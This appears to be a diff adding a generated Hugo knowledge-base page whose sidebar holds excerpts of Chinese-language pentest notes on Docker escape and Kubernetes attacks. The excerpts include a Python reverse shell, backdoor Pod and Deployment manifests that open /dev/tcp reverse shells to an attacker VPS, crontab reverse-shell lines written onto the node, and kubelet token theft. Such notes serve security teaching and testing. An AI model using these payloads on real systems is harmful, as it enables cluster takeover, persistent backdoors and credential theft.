@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+<html lang="zh-CN" dir="ltr">
+<head>
+	<meta name="generator" content="Hugo 0.152.2"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>My Hugo Knowledgebase</title>
+
+    <link rel="stylesheet" href="/css/main.css">
+
+
+      <script src="/js/main.js"></script>
+
+
+</head>
+<body>
+  <header>
+    <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
+  <a href="/" style="font-weight: bold; font-size: 1.2em; text-decoration: none; color: var(--text-color);">My Hugo Knowledgebase</a>
+  <button id="theme-toggle" class="theme-toggle" aria-label="Toggle Dark Mode" style="font-size: 0.9em;">
+    Theme
+  </button>
+</div>
+
+  </header>
+  <main>
+    
+<div class="container">
+  <div class="sidebar-left tree">
+    <h3>Directory</h3>
+    
+    
+
+    
+      <ul class="tree-list">
+  
+    <li>
+      
+        <span class="tree-toggle expanded"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/" class="section-link"><strong>云安全</strong></a>
+        <div class="tree-children">
+          <ul class="tree-list">
+  
+    <li>
+      
+        <span class="tree-toggle expanded"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/" class="section-link"><strong>Docker安全</strong></a>
+        <div class="tree-children">
+          <ul class="tree-list">
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8%E6%A6%82%E8%A7%88/" class="article-link" data-summary="Docker安全概览 前面的文章已经简单介绍了docker容器相关概念，docker的使用对于接触过ctf出题的人来说还是相对熟悉了，这里也不做过多介绍，接下来从安全的角度来分析一下docker
+Docker面临的风险 镜像风险 镜像的内容是由用户进行配置的，所以有可能造成一些安全问题
+不安全的第三方组件 比如在镜像中引入了一些具有严重nday的组件，毫无疑问，这个镜像也就存在漏洞了
+不安全的镜像 类似供应链攻击，在公共镜像仓库比如 Docker Hub 里，会存在一些有漏洞的镜像或者恶意镜像，如果使用了这些镜像那就存在风险了
+敏感信息泄漏 如果在镜像开发完毕后没有删除自己配置的api key、AK/SK等，那么如果别人获取到该镜像就可能造成敏感信息泄漏
+活动中的容器风险 容器在运行时也有一些能够用户自定义的配置，这些配置不当同样可能造成风险
+不安全的容器应用 比如映射出来的端口的服务存在漏洞，那么自然会导致风险
+不受限制的资源共享 容器运行在宿主机上，容器必然要使用宿主机的各种 CPU、内存等资源，如果没有对容器进行资源使用限制，那么就存在宿主机被资源耗尽的风险
+不安全的配置/挂载 正常来说，容器有两大隔离机制：
+linux命名空间：实现文件系统、网络、进程、主机名等方面的隔离 linux控制组：实现CPU、内存、硬盘等方面的隔离 而配置不当会导致容器本身隔离机制失效：
+&amp;amp;ndash;privileged：使容器内的 root 权限和宿主机上的 root 权限一致，权限隔离被打破 &amp;amp;ndash;net=host：使容器与宿主机处于同一网络命名空间，网络隔离被打破 &amp;amp;ndash;pid=host：使容器与宿主机处于同一进程命令空间，进程隔离被打破 &amp;amp;ndash;volume /:/host：宿主机根目录被挂载到容器内部，文件系统隔离被打破 容器管理程序接口风险 Docker 守护进程主要监听 UNIX socket 和 TCP socket，默认情况下，Docker 只会监听 UNIX socket
+UNIX socket 风险主要在于Docker守护进程默认以宿主机的root权限运行，说到这里其实熟悉后渗透的师傅都能想到，可以利用这一点进行提权，除此之外我们还可以利用这点进行容器逃逸，这类风险有两个利用场景
+普通用户被加到Docker用户组内
+如果普通用户被加入到 Docker 用户组内，那么普通用户也将有权限访问 Docker UNIX socket，如果攻击者获得了这个普通用户权限，就可以借助 Docker 提权到 root 用户权限
+Unix socket挂载到容器内部
+有时为了实现容器内部管理容器，可能会将 Docker UNIX socket 挂载到容器内部，那么如果该容器被入侵，渗透测试人员就可以借助这个 socket 进行容器逃逸获得宿主机 root 权限
+">Docker安全概览</a>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E9%80%83%E9%80%B8%E6%89%8B%E6%B3%95%E5%A4%A7%E5%85%A8/" class="article-link" data-summary="Docker逃逸手法大全 Docker相关安全风险更多集中在Docker逃逸方面
+和基础的后渗透思路一样，在获取docker的权限后需要对docker进行信息搜集，判断是否具有满足docker逃逸的条件
+判断是否为容器环境 在之前的文章中也提到过，可以通过查看cgroup信息等方法来判断，可以参考我的这篇笔记：快速识别虚拟主机、Docker和K8s集群环境
+不过查看cgroup目录的方法似乎只对cgroup v1有用，所以推荐使用查看根目录.dockerenv的办法：
+ls -al /.dockerenv 确认为容器环境之后，就可以查看是否具有满足逃逸的条件了，接下来从基础概念、环境搭建、信息搜集、漏洞利用等方面记录一下docker逃逸的一些tricks，当然如果比较懒，也可以试试开源的自动检测脚本：项目地址：https://github.com/teamssix/container-escape-check
+挂载宿主机procfs逃逸 基础概念 procfs（/proc）是一个伪文件系统，反映了系统内进程以及其他组件的状态，其中有很多敏感文件
+user namespace是linux的一项安全功能，允许在容器中映射和隔离用户ID
+而在容器内默认启用root权限，且默认没有开启User Namespace时，容器中的root用户与宿主机的root用户UID会一致（均为0），在这种情况下，如果将procfs挂载到不受控的容器中，则可能会导致容器逃逸，这里运用到一个tricks：
+从 2.6.19 内核版本开始，Linux 支持在 /proc/sys/kernel/core_pattern 中使用新语法。如果该文件中的首个字符是管道符 | ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行
+环境搭建 创建容器并挂载/proc目录：
+docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu 搭建完毕
+信息搜集 如果发现了两个core_pattern文件，则可能就是挂载了宿主机的procfs：
+find / -name core_pattern 漏洞利用 找到当前容器在主机下的绝对路径：
+cat /proc/mounts | xargs -d &amp;amp;#39;,&amp;amp;#39; -n 1 | grep workdir 可以看到绝对路径为/var/lib/docker/overlay2/8c1a0695756000c2afc1ba95bf605dda88027b937c937e8f2527b597447f37ac/work
+接下来安装vim和gcc：
+apt-get update -y &amp;amp;amp;&amp;amp;amp; apt-get install vim gcc -y 然后创建一个python脚本用于反弹shell：
+#!/usr/bin/python3 import os import pty import socket lhost = &amp;amp;#34;xx.xx.xx.xx&amp;amp;#34; lport = 7777 def main(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) os.putenv(&amp;amp;#34;HISTFILE&amp;amp;#34;, &amp;amp;#39;/dev/null&amp;amp;#39;) pty.spawn(&amp;amp;#34;/bin/bash&amp;amp;#34;) # os.remove(&amp;amp;#39;/tmp/.shell.py&amp;amp;#39;) s.close() if __name__ == &amp;amp;#34;__main__&amp;amp;#34;: main() 赋予执行权限：
+">Docker逃逸手法大全</a>
+      
+    </li>
+  
+</ul>
+
+        </div>
+      
+    </li>
+  
+    <li>
+      
+        <span class="tree-toggle expanded"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/" class="section-link"><strong>K8s安全</strong></a>
+        <div class="tree-children">
+          <ul class="tree-list">
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%8A%A8%E6%80%81%E5%AE%B9%E5%99%A8%E6%B3%A8%E5%85%A5/" class="article-link" data-summary="动态容器注入-一种隐蔽的k8s权限维持方法 恶意pod-&amp;amp;gt;反弹shell-&amp;amp;gt;挂载宿主机(node)/-&amp;amp;gt;cron写定时任务反弹shell-&amp;amp;gt;master-node
+k8s控制器
+众所周知，k8s的持久化有很多方法：
+部署后门pod 部署cronjob 部署shadowApiserver 部署恶意deployment 部署恶意deamonset 这些方法大家想必都很熟悉了，而这些方法都需要我们额外创建新的pod或者k8s控制器，k8s中多出来一些pod和控制器很容易就被发现了，有没有什么能够利用原有控制器和pod的办法呢？
+这里就有一种叫做动态容器注入的方式
+目前来说的注入方式有两种，一种是将一个sidecar容器注入到原有pod中，一种是将存活探针注入到原有pod中
+利用sidecar容器技术进行注入 这里提到一个技术叫sidecar，简单理解就是在同一个 Pod 里额外放一只容器，为主业务容器提供增强能力，生命周期与主容器完全一致（同启、同停、同网络、同存储卷）。具体技术用途可以在官方文档了解：https://kubernetes.io/zh-cn/docs/concepts/workloads/pods/sidecar-containers/
+这里可以利用k8s控制器，像daemonset这类，我们可以更改它yaml的spec.template的内容，并replace触发其更新，这样就能实现在原容器上增加一个恶意的sidecar容器，而不用增加一个新的控制器或独立pod
+为什么选择daemonset：
+它能够确保所有节点（包括新增节点）上都运行一个Pod
+如果有Pod退出，DaemonSet将在对应节点上自动重建一个Pod
+值得一题的是，我们注入的恶意容器需要怎么配置比较好呢，思路可以从去除容器与宿主机隔离的角度出发：
+容器是特权的（相当于docker run的时候带了–privileged选项）
+容器与宿主机共享网络和PID命名空间（打破命名空间隔离）
+容器内挂载宿主机根目录（打破文件系统隔离）
+这样一来，我们获得sidecar容器的shell实际上和节点的shell区别就不大了
+基础注入 一般来说，我们会考虑对kube-system命名空间中已运行的daemonset进行注入，常用的是k8s中的kube-proxy，比如接下来这个例子：
+我们探测一下是否存在kube-proxy：
+kubectl get daemonset -n kube-system 我们也可以看到这个daemonset控制的pod：
+接下来我们来读这个daemonset的yaml：
+kubectl get daemonset -n kube-system -o yaml 我们可以在这个yaml基础上进行修改实现注入：
+我们先分析原yaml的spec：
+spec: revisionHistoryLimit: 10 selector: matchLabels: k8s-app: kube-proxy template: metadata: creationTimestamp: null labels: k8s-app: kube-proxy spec: containers: - command: - /usr/local/bin/kube-proxy - --config=/var/lib/kube-proxy/config.conf - --hostname-override=$(NODE_NAME) env: - name: NODE_NAME valueFrom: fieldRef: apiVersion: v1 fieldPath: spec.nodeName image: registry.k8s.io/kube-proxy:v1.30.14 imagePullPolicy: IfNotPresent name: kube-proxy resources: {} securityContext: privileged: true terminationMessagePath: /dev/termination-log terminationMessagePolicy: File volumeMounts: - mountPath: /var/lib/kube-proxy name: kube-proxy - mountPath: /run/xtables.lock name: xtables-lock - mountPath: /lib/modules name: lib-modules readOnly: true dnsPolicy: ClusterFirst hostNetwork: true nodeSelector: kubernetes.io/os: linux priorityClassName: system-node-critical restartPolicy: Always schedulerName: default-scheduler securityContext: {} serviceAccount: kube-proxy serviceAccountName: kube-proxy terminationGracePeriodSeconds: 30 tolerations: - operator: Exists volumes: - configMap: defaultMode: 420 name: kube-proxy name: kube-proxy - hostPath: path: /run/xtables.lock type: FileOrCreate name: xtables-lock - hostPath: path: /lib/modules type: &amp;amp;#34;&amp;amp;#34; name: lib-modules updateStrategy: rollingUpdate: maxSurge: 0 maxUnavailable: 1 type: RollingUpdate 我们只需要在此基础上增加两个新对象：
+">k8s权限维持-动态容器注入</a>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="article-link" data-summary="K8s渗透-信息搜集 文章首发于track安全社区：K8s渗透入门从零到一
+这一步发生在内网信息搜集的过程中，内网一般不会完全基于容器技术构建，所以内网搜集的起点一般可以分为权限受限的主机和物理主机内网
+k8s内部集群网络主要依靠网络插件，目前使用比较多的是Flannel和Calico
+而通信类型存在4种：
+同一pod内的容器间通信 不同pod间的通信 pod与service间的通信 集群外部的流量与service间的通信 shell环境辨别 如果我们的起点是一个在k8s集群内部权限受限的容器，那么内网探测的过程依然遵循常规内网探测，可以先在搜集的时候判断当前是否是云环境，可以参考我的笔记：快速识别虚拟主机、Docker和K8s集群环境
+一些常用命令：
+ps aux ls -l .dockerenv capsh --print env | grep KUBE ls -l /run/secrets/kubernetes.io/ mount df -h cat /proc/1/cgroup cat /etc/resolv.conf cat /etc/mtab cat /proc/self/status cat /proc/self/mounts cat /proc/net/unix cat /proc/1/mountinfo 这里的cat /proc/1/cgroup是分辨容器环境一个很实用的命令：
+没使用 Kubernetes 的 docker 容器，其 cgroup 信息格式如下：
+12:hugetlb:/docker/9df9278580c5fc365cb5b5ee9430acc846cf6e3207df1b02b9e35dec85e86c36 而k8s默认的cgroup信息格式如下：
+12:hugetlb:/kubepods/burstable/pod45226403-64fe-428d-a419-1cc1863c9148/e8fb379159f2836dbf990915511a398a0c6f7be1203e60135f1cbdc31b97c197 特权相关搜集 另外capsh --print获取到信息也较为重要，可以打印出当前容器里已有的 Capabilities 权限： 那如果没有capsh命令且无法安装怎么办呢？
+首先cat /proc/1/status 获取到 Capabilities hex 记录:
+然后在我们自己安装了capsh的主机上进行decode：
+如此即可达到代替capsh --print的效果
+">K8s渗透-信息搜集</a>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/" class="article-link" data-summary="K8s渗透-初始访问 文章首发于track安全社区：K8s渗透入门从零到一
+初始访问是攻防矩阵的第一步，可以简单理解为获取对k8s的访问权限
+APIServer未授权 insecure-port开启 典中典的k8s相关漏洞，APIServer在集群中被用于提供API来控制集群内部，如果我们能控制API Server，就意味着我们可以通过它利用kubectl创建Pod并使用磁盘挂载技术获取Node节点控制权
+如果目标主机将APISevrer非安全端口8080暴露出来，便可以利用此端口进行对集群的攻击：
+直接访问8080端口，会返回可用的API列表：
+接下来需要用到kubectl，安装教程见官网
+使用kubectl可以获取集群信息：
+kubectl -s [ip]:[port] get nodes 上面这个案例可以看到有4个节点，其中有一个节点status为ready，可以成为后续执行阶段的入口点，比如利用kubectl调用该apiserver来创建恶意pod
+secure-port开启匿名访问 即6443安全端口的未授权访问
+若我们不带任何凭证的访问 API server的 secure-port端口，默认会被服务器标记为system:anonymous用户。
+一般来说system:anonymous用户权限是很低的，但是如果运维人员管理失当，把system:anonymous用户绑定到了cluster-admin用户组，那么就意味着secure-port允许匿名用户以管理员权限向集群下达命令，这也算是变向的未授权了:
+我们可以通过kubectl进行apiserver调用：
+kubectl -s https://112.126.76.224:6443 --insecure-skip-tls-verify=true cluster-info 当然有可能会遇到这种情况：
+这种时候可以使用浏览器curl去请求api接口查看响应的json都能达到类似效果：
+当然有个很好用的工具叫cdk也可以实现，有个kcurl参数功能是连接K8s api-server发起自定义HTTP请求：
+在匿名用户可以未授权访问6443端口的情况，，我们可以尝试访问/api/v1/namespaces/default/secret路由来尝试获取用户token：
+我们将这里的token字段进行base64解码后可以到到kubectl的6443安全端口进行操作，比如获取当前的权限：
+kubectl auth can-i --list --server=https://119.8.60.88:6443 --token=&amp;amp;#34;&amp;amp;lt;token值&amp;amp;gt;&amp;amp;#34; --insecure-skip-tls-verify 这里可以看到权限非常高
+打法和不安全端口8080未授权类似，这里不再细说
+kubectl proxy暴露 通过反向代理等方式进行端口转发将原本内网的未授权api server暴露到公网
+所以利用方式和apiserver未授权类似，这里不再细说
+kubelet未授权 kubelet和kubectl的区别？
+kubelet是在Node上用于管理本机Pod的，kubectl是用于管理集群的。kubectl向集群下达指令，Node上的kubelet收到指令后以此来管理本机Pod
+每个节点都有一个kubelet服务，kubelet是在每个节点上运行的主要节点代理，监听了10250、10248、10255等端口，负责管理节点上的容器与master节点的通信，而10250端口就是kubelet与API Server进行通信的主要端口
+如果kubeconfig文件中的配置不当，则会导致系统存在kubelet未授权访问，在该情况下，攻击者能够列出当前运行的pod，对任意pod执行命令等，实现进一步的利用
+例如对服务账号绑定了cluster-admin权限的pod执行命令来读取服务账号的token，然后利用高权限token控制apiserver，创建恶意pod并逃逸
+通过请求接口执行命令读取token：
+curl -XPOST -k &amp;amp;#34;https://${K8S}:10250/run/&amp;amp;lt;namespace&amp;amp;gt;/&amp;amp;lt;pod&amp;amp;gt;/&amp;amp;lt;container&amp;amp;gt;&amp;amp;#34; -d &amp;amp;#34;cmd=cat /var/run/secret/kubernetes.io/serviceaccount/token&amp;amp;#34; etcd未授权 k8s使用etcd存储数据，默认监听2379端口，如果该端口暴露到公网且存在未授权访问，就可能导致信息泄漏，攻击者可以通过收集到的凭证来尝试接管集群，而由于本机可免认证访问2379端口，所以可以结合SSRF来打组合拳
+">K8s渗透-初始访问</a>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%89%A7%E8%A1%8C/" class="article-link" data-summary="K8s渗透-执行 文章首发于track安全社区：K8s渗透入门从零到一
+执行阶段的主要任务是实现在集群内执行任意命令，获得shell
+kubectl exec进入容器 当我们能够控制apiserver时，和docker类似，我们可以使用命令进入容器的shell中执行命令：
+# apiserver未授权时 kubectl -s x.x.x.x:8080 --namespace=default exec -it test-rev -- bash # 获取到kubeconfig文件时 kubectl --kubeconfig config --namespace=default exec -it test-rev -- bash # 获取到高权限token时 kubectl --server=https://x.x.x.x:6443 --token=&amp;amp;#34;&amp;amp;lt;token值&amp;amp;gt;&amp;amp;#34; --insecure-skip-tls-verify --namespace=default exec -it test-rev -- bash 比如这里进入容器执行反弹shell命令
+成功监听到反弹shell：
+创建后门pod 获取初始访问权限后，通过创建后门pod来执行后续攻击，
+首先本机上新建个yaml文件用于创建容器，将节点的根目录挂载到容器的 /mnt 目录，并在容器启动后自动执行反弹shell命令，内容如下：
+apiVersion: v1 kind: Pod metadata: name: test-rev spec: nodeName: &amp;amp;lt;节点名称&amp;amp;gt; containers: - name: test-container image: ubuntu command: [&amp;amp;#34;/bin/sh&amp;amp;#34;] args: - &amp;amp;#34;-c&amp;amp;#34; - | apt update &amp;amp;amp;&amp;amp;amp; apt install -y bash netcat-openbsd &amp;amp;amp;&amp;amp;amp; \ bash -c &amp;amp;#39;while true; do bash -i &amp;amp;gt;&amp;amp;amp; /dev/tcp/&amp;amp;lt;你的vps的公网IP&amp;amp;gt;/2333 0&amp;amp;gt;&amp;amp;amp;1; sleep 60; done&amp;amp;#39; volumeMounts: - mountPath: /mnt name: test-volume securityContext: privileged: true volumes: - name: test-volume hostPath: path: / 然后使用 kubectl 创建文件指定的恶意容器：
+">K8s渗透-执行</a>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%8C%81%E4%B9%85%E5%8C%96/" class="article-link" data-summary="K8s渗透-持久化 文章首发于track安全社区：K8s渗透入门从零到一
+持久化即权限维持，通过持久化在k8s中留下后门，可以在初始访问的入口点丢掉之后仍然保持对k8s的控制权
+部署后门容器 在拥有了创建pod的权限后，我们就可以创建一个恶意的pod为我们实现权限维持（即在容器中留下shell），并且在pod中留下能控制node的后门（比如挂载node的根目录）
+常见方法如下
+挂载目录 向创建的pod中挂载一些用于逃逸的目录，在我的逃逸相关文章详细记录了：K8s渗透-权限提升
+这里值得一提的是，我们可以使用这个配置：
+restartPolicy: Always 可以让pod在被关闭后重启
+使用k8s控制器部署后门容器 在前面 K8s渗透-执行 的文章中，我们部署后门容器的方式是使用yaml文件，而文件中有这样一行：
+kind: Pod 这代表我们创建的后门容器就是一个单纯的pod，而除此之外还有一类后门是控制器，它能自动创建和控制恶意pod，并且它也基于yaml文件创建，优点是更稳定，其自动创建的pod在被kill后可以被恢复，它的yaml文件格式如下：
+apiVersion: apps/v1 kind: Deployment metadata: name: test-rev spec: replicas: 1 selector: matchLabels: app: test-rev template: metadata: labels: app: test-rev spec: nodeName: &amp;amp;lt;节点名称&amp;amp;gt; containers: - name: test-container image: ubuntu command: [&amp;amp;#34;/bin/sh&amp;amp;#34;] args: - &amp;amp;#34;-c&amp;amp;#34; - | apt update &amp;amp;amp;&amp;amp;amp; apt install -y bash netcat-openbsd &amp;amp;amp;&amp;amp;amp; \ bash -c &amp;amp;#39;while true; do bash -i &amp;amp;gt;&amp;amp;amp; /dev/tcp/&amp;amp;lt;你的vps的公网IP&amp;amp;gt;/2333 0&amp;amp;gt;&amp;amp;amp;1; sleep 60; done&amp;amp;#39; volumeMounts: - mountPath: /mnt name: test-volume securityContext: privileged: true volumes: - name: test-volume hostPath: path: / 指定yaml文件即可创建：
+">K8s渗透-持久化</a>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" class="article-link" data-summary="K8s渗透-权限提升 文章首发于track安全社区：K8s渗透入门从零到一
+一般来说，在k8s中的提权就是尝试从pod容器获取到对node节点的控制权，甚至获取对云资源的访问权限。
+RBAC权限滥用 类似于我们在执行中提到的打法，就是获取pod中高权限（比如绑定到cluster-admin用户组）的serviceaccount，然后再调用apiserver实现逃逸，然而除了cluster-admin，很多凭证也是可以权限提升到cluster-admin的，我们可以重点关注Helm、Cilium、Nginx Ingress、Prometheus等服务
+部署静态pod 这个方法在我的k8s渗透-持久化的笔记中已经介绍过了，这里不再赘述
+利用容器不安全配置提权 即容器逃逸，这里的很多tricks其实和docker逃逸没有很大区别
+挂载目录逃逸 挂载的方法很多，例如挂载根目录、挂载pocfs、挂载/etc、挂载cgroup、挂载/var/log等等，可以直接看我的这篇文章：Docker逃逸手法大全，这里提一个最简单的挂载根目录：
+比如我们创建恶意pod的时候，根目录挂载到了容器的/mnt目录，所以在获取了pod的shell后，我们可以通过查看pod的/mnt目录来访问查看node的根目录：
+接下来可以通过写定时任务来获取node的shell：
+echo -e &amp;amp;#34;* * * * * root /bin/bash -c &amp;amp;#39;sh -i &amp;amp;gt;&amp;amp;amp; /dev/tcp/&amp;amp;lt;vps的公网IP&amp;amp;gt;/4444 0&amp;amp;gt;&amp;amp;amp;1 &amp;amp;amp; disown &amp;amp;#39;&amp;amp;#34; &amp;amp;gt;&amp;amp;gt; /mnt/etc/crontab 注意，这里并没有直接使用sh -i &amp;amp;gt; /dev/tcp/&amp;amp;lt;IP&amp;amp;gt;/4444 2&amp;amp;gt;&amp;amp;amp;1，因为cron 默认使用的是 /bin/sh，而不是 bash，sh 不支持&amp;amp;gt;&amp;amp;amp;语法，上面的yaml文件中反弹shell的payload同理
+我在k3s环境遇到一个问题，在收到反弹shell后会立刻自动exit或者退出：
+这里其实可以偷懒直接chroot一下也行，但是这样只能以高权限进行文件相关操作： 不过通过查阅资料发现原因可能和busybox的情况类似，对-i即交互参数支持不完整，那么我们可以尝试使用disown命令让我们反弹shell的进程不受父shell进程影响而exit：
+echo -e &amp;amp;#34;* * * * * root /bin/bash -c &amp;amp;#39;bash -i &amp;amp;gt;&amp;amp;amp; /dev/tcp/&amp;amp;lt;IP&amp;amp;gt;/4444 0&amp;amp;gt;&amp;amp;amp;1 &amp;amp;amp; disown&amp;amp;#39;&amp;amp;#34; &amp;amp;gt;&amp;amp;gt; /mnt/etc/crontab 此时我们就可以接收到反弹的shell并且不会断开了： 持久化挂载docker.sock 挂载docker socket逃逸同样在我写的 Docker逃逸手法大全 中详细介绍了，值得一提的是，如果已经获取了此类容器的 full tty shell, 可以用类似下述的命令创建一个通往宿主机的 shell：
+">K8s渗透-权限提升</a>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="article-link" data-summary="k8s渗透-横向移动 窃取凭证 kubeconfig凭证 kubeconfig文件通常出现在运维PC、内网跳板机、堡垒机、master节点等机器上，kubeconfig文件的使用在我的 k8s渗透-初始访问 笔记中已经介绍了，这里不再说明
+secret对象 在k8s中，secret对象用于存储密码、OAuth令牌、ssh密钥等敏感信息，我们可以尝试从中窃取其他服务的通信凭证：
+kubeconfig get secrets -A 查看指定secret内容：
+kubectl --kubeconfig config -n [指定命名空间] get secret [secret名称] -o yaml 可惜这里案例上是hash，如果是硬编码在secret中，就可以解码获取明文密码了
+集群内网渗透 K8s默认允许集群内部的pod和service直接通信，在没有NetworkPolicy / eBPF限制的情况下，无论是node还是pod，内网的通信和常规内网渗透的情况基本无差异，我们仍然可以使用nmap、masscan、fscan等扫描工具进行内网探索，也可以使用常规内网的横向移动手段
+第三方组件风险 在很多k8s的配置教程中会存在一些忽略真实环境安全问题的情况，导致一些插件/服务存在未授权的情况，甚至是服务账号具有高权限，基于这些情况，我们可以关注一些常见的服务账号比如helm、cilium、Nginx Ingress、Prometheus，比如helm v2版本默认存在高权限账号，那么可以利用高权限给自己赋予cluster-admin进而提权逃逸
+简而言之，我们的思路可以是：进入pod，通过漏洞/未授权攻击第三方组件，利用组件的不当权限操作k8s集群
+污点（taint）横向 这个方法较为鸡肋，原因是k8s污点横向需要配合一些漏洞，而这些配合漏洞往往可以单独拿到权限
+污点是k8s高级调度的特性，用于限制哪些pod能被调度到某一节点上
+其中污点有三种属性(效果)：
+NoSchedule：这是最常见的类型，表示不允许 Pod 被自动调度到带有此污点的节点上。只有当 Pod 具有与污点匹配的容忍度时，才能在这些节点上调度 Pod。 PreferNoSchedule：这种类型表示不推荐但允许 Pod 被调度到带有此污点的节点上。即使节点上设置了 PreferNoSchedule 污点，如果没有其他更适合的节点，Pod 仍然可以被调度到这些节点上。 NoExecute：这种类型表示节点上的Pod会被驱逐（Eviction），即使它们已经运行在该节点上。通常，NoExecute 污点会导致 Pod 被终止并迁移到其他节点。 一般来说master节点包含一个污点，而这个污点通常用于阻止pod调度到主节点上，除非pod能容忍该污点（通常容忍这个污点的pod都是系统级，别比如kube-system命名空间下的pod），在普通节点横向时，我们可以使用污点容忍度创建恶意pod尝试横向到主节点
+比如：获取worker节点权限，创建配置了与master节点污点对应容忍度的恶意node，yaml如下：
+cat &amp;amp;gt; x.yaml &amp;amp;lt;&amp;amp;lt; EOF apiVersion: v1 kind: Pod metadata: name: control-master-x spec: tolerations: - key: &amp;amp;#34;node-role.kubernetes.io/master&amp;amp;#34; operator: &amp;amp;#34;Exists&amp;amp;#34; effect: &amp;amp;#34;NoSchedule&amp;amp;#34; containers: - name: control-master-x image: ubuntu:18.04 command: [&amp;amp;#34;/bin/sleep&amp;amp;#34;, &amp;amp;#34;3650d&amp;amp;#34;] volumeMounts: - name: master mountPath: /master volumes: - name: master hostPath: path: / type: Directory EOF 这样create的pod允许被调度到主节点，这里多次尝试创建就有机会创建到master节点，进而逃逸接管master节点
+">k8s渗透-横向移动</a>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F%E5%85%A5%E9%97%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/" class="article-link" data-summary="K8s渗透从0到1 文章首发于track安全社区：K8s渗透入门从零到一
+k8s基础 k8s架构 Kubernetes 又称 k8s，是 Google 在 2014 年开源的一个用来管理容器的平台
+k8s基本架构如下（图片的scheduler打错了，特此更正）： 从上图来看可以知道，k8s主要由较少的master节点和其对应的多个Node节点组成，master节点对node及诶单进行管理控制，一个K8s集群至少要有一台master节点
+master节点主要有以下核心组件：
+etcd 保存了整个集群的状态 API Server 提供了资源操作的唯一入口，并提供认证、授权、访问控制、API 注册和发现等机制 Controller Manager 负责维护集群的状态，比如故障检测、自动扩展、滚动更新等 Scheduler 负责资源的调度，按照预定的调度策略将 Pod 调度到相应的机器上 node节点有以下核心组件：
+Kubelet 负责维护容器的生命周期，同时也负责Volume（CVI）和网络（CNI）的管理，每个node节点中都存在一份
+Container Runtime 负责镜像管理以及 Pod 和容器的真正运行（CRI），早期是docker引擎作为组件，从v1.20开始使用 containerd、CRI-O 等
+Kube-proxy 负责为 Service 提供 Cluster 内部的服务发现和负载均衡
+pod 是k8s中的最小调度单位，pod内部就是容器，k8s通过操作pod来控制容器，一个node下面可以有多个pod
+fluentd不是 Kubernetes 的核心组件，但常用于日志收集，将 Pod 的 stdout/stderr 日志采集到集中系统（如 Elasticsearch、Kafka）中。
+Pod可以说是Node节点中最核心的部分，Pod也是一个容器，它是一个”用来封装容器的容器”。一个Pod中往往会装载多个容器，这些容器共用一个虚拟环境，共享着网络和存储等资源
+这些容器的资源共享以及相互交互都是由pod里面的pause容器来完成的，每初始化一个pod时便会生成一个pause容器
+k8s特点 和docker相比，docker更偏向于单机管理，而k8s则是偏向于多机集群管理，由于容器的寿命比较短暂，需要经常调试环境，而重新打包部署容器比较麻烦，又会存在一系列问题，包括但不限于网络，数据同步等，因此才有了K8S来对容器进行部署和管理
+k8s具有如下的特点：
+自我修复：对容器进行监测，出现问题就在原有无问题容器基础上进行复制启动，出现问题的容器进行抛弃或重启
+弹性伸缩：容器数量的控制
+自动部署和回滚：通过配置文件进行自动的容器构建，对容器的回滚更新
